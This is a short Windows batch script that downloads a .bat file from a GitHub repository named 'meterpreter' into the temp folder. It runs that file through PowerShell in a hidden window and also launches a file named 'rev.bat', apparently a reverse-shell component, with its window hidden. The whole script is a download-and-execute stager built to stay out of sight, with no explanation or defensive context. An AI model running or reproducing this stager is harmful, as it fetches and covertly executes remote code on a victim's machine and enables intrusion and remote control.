@echo off
curl https://raw.githubusercontent.com/0x2034/meterpreter/main/nihbtdtdow.bat -o "%temp%\nihbtdtdow.bat"
powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\nihbtdtdow.bat\" -WindowStyle Hidden"
powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden"
